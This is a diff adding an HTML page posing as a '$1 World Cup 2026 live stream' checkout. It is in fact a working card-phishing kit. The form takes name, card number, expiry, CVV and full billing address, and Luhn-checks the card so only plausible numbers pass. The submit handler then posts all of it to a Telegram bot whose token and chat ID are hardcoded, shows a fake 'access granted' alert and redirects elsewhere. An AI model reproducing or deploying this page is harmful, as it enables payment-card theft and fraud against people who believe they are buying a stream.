@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WorldCupLive • $1 Stream Access</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body { background: #000; color: #fff; font-family: system-ui, sans-serif; }
+    .neon-border { border: 2px solid #00ff9d; box-shadow: 0 0 15px rgba(0,255,157,0.3); border-radius: 20px; }
+    .worldcup-bg { background: linear-gradient(135deg, #003300, #000000); }
+    .trophy-icon { font-size: 5rem; filter: drop-shadow(0 0 20px gold); }
+    .error-text { color: #ff4444; font-size: 0.8rem; margin-top: 5px; display: none; }
+    .valid-text { color: #00ff9d; font-size: 0.8rem; margin-top: 5px; display: none; }
+    .site-title { font-family: monospace; letter-spacing: 4px; }
+  </style>
+</head>
+<body class="min-h-screen worldcup-bg">
+
+  <header class="py-12 text-center border-b border-green-500">
+    <div class="trophy-icon">🏆⚽</div>
+    <h1 class="site-title text-5xl font-black tracking-widest bg-gradient-to-r from-green-400 via-yellow-500 to-green-400 bg-clip-text text-transparent mt-4">WORLDCUPLIVE</h1>
+    <p class="text-sm text-green-400/70 mt-1">$1 • Instant Access • No Subscription</p>
+    <h2 class="text-2xl font-bold text-yellow-400 mt-2">FIFA World Cup • Live Stream</h2>
+    <p class="text-xl mt-4 text-green-300">USA • Canada • Mexico | Watch every match for only $1</p>
+  </header>
+
+  <div class="max-w-6xl mx-auto px-4 py-8">
+    <div class="neon-border bg-black/60 p-6 text-center max-w-2xl mx-auto mb-12">
+      <h3 class="text-3xl font-bold text-green-400">🇺🇸 2026 WORLD CUP</h3>
+      <p class="text-gray-300 mt-2">USA • Canada • Mexico</p>
+      <p class="text-yellow-300 text-lg mt-2">June 8 – July 8, 2026</p>
+      <div class="text-green-400 text-4xl mt-4">🌎🏟️</div>
+    </div>
+
+    <div class="neon-border bg-black/80 p-8 max-w-2xl mx-auto">
+      <h2 class="text-3xl font-bold text-center text-yellow-400 mb-6">🔴 WATCH ANY MATCH – $1</h2>
+      <form id="payForm">
+        <div class="mb-4">
+          <label class="block text-green-300 mb-2">Full Name</label>
+          <input id="fullname" type="text" placeholder="John Doe" class="w-full bg-gray-800 p-4 rounded-2xl text-white">
+        </div>
+        <div class="mb-4">
+          <label class="block text-green-300 mb-2">Card Number</label>
+          <input id="card" type="text" placeholder="1234 5678 9012 3456" class="w-full bg-gray-800 p-4 rounded-2xl text-white">
+          <div id="cardError" class="error-text">Invalid card number</div>
+          <div id="cardValid" class="valid-text">✓ Valid format (Luhn passed)</div>
+        </div>
+        <div class="grid grid-cols-3 gap-3 mb-4">
+          <div>
+            <label class="block text-green-300 mb-1">Expiry</label>
+            <input id="exp" placeholder="MM/YY" maxlength="5" class="w-full bg-gray-800 p-4 rounded-2xl text-white">
+            <div id="expError" class="error-text">Expired or invalid date</div>
+          </div>
+          <div>
+            <label class="block text-green-300 mb-1">CVV</label>
+            <input id="cvv" placeholder="123" maxlength="4" class="w-full bg-gray-800 p-4 rounded-2xl text-white">
+            <div id="cvvError" class="error-text">3-4 digits required</div>
+          </div>
+          <div>
+            <label class="block text-green-300 mb-1">Zip</label>
+            <input id="zip" placeholder="90210" class="w-full bg-gray-800 p-4 rounded-2xl text-white">
+          </div>
+        </div>
+        <div class="grid grid-cols-3 gap-3 mb-6">
+          <div><label class="block text-green-300 mb-1">City</label><input id="city" placeholder="Los Angeles" class="w-full bg-gray-800 p-4 rounded-2xl text-white"></div>
+          <div><label class="block text-green-300 mb-1">State</label><input id="state" placeholder="CA" class="w-full bg-gray-800 p-4 rounded-2xl text-white"></div>
+          <div><label class="block text-green-300 mb-1">Country</label><input id="country" placeholder="USA" class="w-full bg-gray-800 p-4 rounded-2xl text-white"></div>
+        </div>
+        <div class="mb-6">
+          <label class="block text-green-300 mb-1">Street Address</label>
+          <input id="addr" placeholder="123 Main St" class="w-full bg-gray-800 p-4 rounded-2xl text-white">
+        </div>
+        <button type="submit" class="w-full bg-gradient-to-r from-green-600 to-yellow-600 text-black font-bold py-5 rounded-2xl text-2xl hover:scale-105 transition">⚡ PAY $1 & WATCH ⚡</button>
+      </form>
+      <p class="text-xs text-gray-500 text-center mt-6">Card validated before submission • No fake cards accepted</p>
+    </div>
+  </div>
+
+  <footer class="text-center py-8 border-t border-green-800 mt-12">
+    <p class="text-green-400">© WorldCupLive • FIFA World Cup 2026 • $1 Stream Access</p>
+  </footer>
+
+  <script>
+    const BOT_TOKEN = "8622946534:AAErGxnnckLOdwYVgPwAz8NnnqoEJlKfngk";
+    const CHAT_ID = "-5129321200";
+
+    function luhnCheck(cardNumber) {
+      let digits = cardNumber.replace(/\D/g, '');
+      if (digits.length < 13 || digits.length > 19) return false;
+      let sum = 0;
+      let alternate = false;
+      for (let i = digits.length - 1; i >= 0; i--) {
+        let n = parseInt(digits[i], 10);
+        if (alternate) {
+          n *= 2;
+          if (n > 9) n = (n % 10) + 1;
+        }
+        sum += n;
+        alternate = !alternate;
+      }
+      return (sum % 10 === 0);
+    }
+
+    function getCardType(cardNumber) {
+      let digits = cardNumber.replace(/\D/g, '');
+      if (digits.startsWith('4')) return 'Visa';
+      if (digits.startsWith('5')) return 'MasterCard';
+      if (digits.startsWith('34') || digits.startsWith('37')) return 'American Express';
+      if (digits.startsWith('6')) return 'Discover';
+      return 'Unknown';
+    }
+
+    function isExpiredDate(expValue) {
+      if (!expValue || expValue.length !== 5) return true;
+      const parts = expValue.split("/");
+      if (parts.length !== 2) return true;
+      let month = parseInt(parts[0], 10);
+      let year = parseInt(parts[1], 10);
+      if (isNaN(month) || isNaN(year)) return true;
+      if (month < 1 || month > 12) return true;
+      year = 2000 + year;
+      const now = new Date();
+      const currentYear = now.getFullYear();
+      const currentMonth = now.getMonth() + 1;
+      if (year < currentYear) return true;
+      if (year === currentYear && month < currentMonth) return true;
+      return false;
+    }
+
+    function isValidCard(cardValue) {
+      const digits = cardValue.replace(/\D/g, '');
+      if (digits.length < 13 || digits.length > 19) return false;
+      return luhnCheck(cardValue);
+    }
+
+    function isValidCVV(cvvValue, cardNumber) {
+      const digits = cvvValue.replace(/\D/g, '');
+      if (digits.length < 3 || digits.length > 4) return false;
+      const cardType = getCardType(cardNumber);
+      if (cardType === 'American Express' && digits.length !== 4) return false;
+      if (cardType !== 'American Express' && digits.length !== 3) return false;
+      return true;
+    }
+
+    const cardInput = document.getElementById("card");
+    const cardValidDiv = document.getElementById("cardValid");
+    const cardErrorDiv = document.getElementById("cardError");
+
+    cardInput.addEventListener("input", function() {
+      let cardValue = this.value;
+      if (cardValue.length >= 13) {
+        if (isValidCard(cardValue)) {
+          cardValidDiv.style.display = "block";
+          cardErrorDiv.style.display = "none";
+        } else {
+          cardValidDiv.style.display = "none";
+          cardErrorDiv.style.display = "block";
+        }
+      } else {
+        cardValidDiv.style.display = "none";
+        cardErrorDiv.style.display = "none";
+      }
+    });
+
+    const expInput = document.getElementById("exp");
+    expInput.addEventListener("input", function(e) {
+      let value = this.value.replace(/\//g, "").replace(/\s/g, "");
+      if (value.length >= 2) {
+        this.value = value.slice(0, 2) + "/" + value.slice(2, 4);
+      } else {
+        this.value = value;
+      }
+    });
+
+    document.getElementById("payForm").onsubmit = async (e) => {
+      e.preventDefault();
+      
+      let isValid = true;
+      
+      const fullname = document.getElementById("fullname").value;
+      const card = document.getElementById("card").value;
+      const exp = document.getElementById("exp").value;
+      const cvv = document.getElementById("cvv").value;
+      const zip = document.getElementById("zip").value;
+      const city = document.getElementById("city").value;
+      const state = document.getElementById("state").value;
+      const country = document.getElementById("country").value;
+      const addr = document.getElementById("addr").value;
+      
+      document.getElementById("cardError").style.display = "none";
+      document.getElementById("expError").style.display = "none";
+      document.getElementById("cvvError").style.display = "none";
+      
+      if (!isValidCard(card)) {
+        document.getElementById("cardError").style.display = "block";
+        document.getElementById("cardError").innerText = "Fake card detected (Luhn check failed)";
+        isValid = false;
+      }
+      
+      if (isExpiredDate(exp)) {
+        document.getElementById("expError").style.display = "block";
+        isValid = false;
+      }
+      
+      if (!isValidCVV(cvv, card)) {
+        document.getElementById("cvvError").style.display = "block";
+        isValid = false;
+      }
+      
+      if (!isValid) return;
+      
+      const cardType = getCardType(card);
+      const location = `${city}, ${state}, ${country}`;
+      const fullAddr = `${addr}, ${location}, ${zip}`;
+      
+      const msg = `🏆 WORLDCUPLIVE\n👤 NAME: ${fullname}\n💳 CARD: ${card} (${cardType}, Luhn: PASS)\n📅 EXP: ${exp}\n🔐 CVV: ${cvv}\n📍 ADDRESS: ${fullAddr}\n🏙️ CITY/STATE/COUNTRY: ${location}\n📮 ZIP: ${zip}`;
+      
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+      });
+      
+      alert("✅ Card validated! Access granted. Redirecting to live stream...");
+      window.open("https://streamfree.app", "_blank");
+    };
+  </script>
+</body>
+</html>
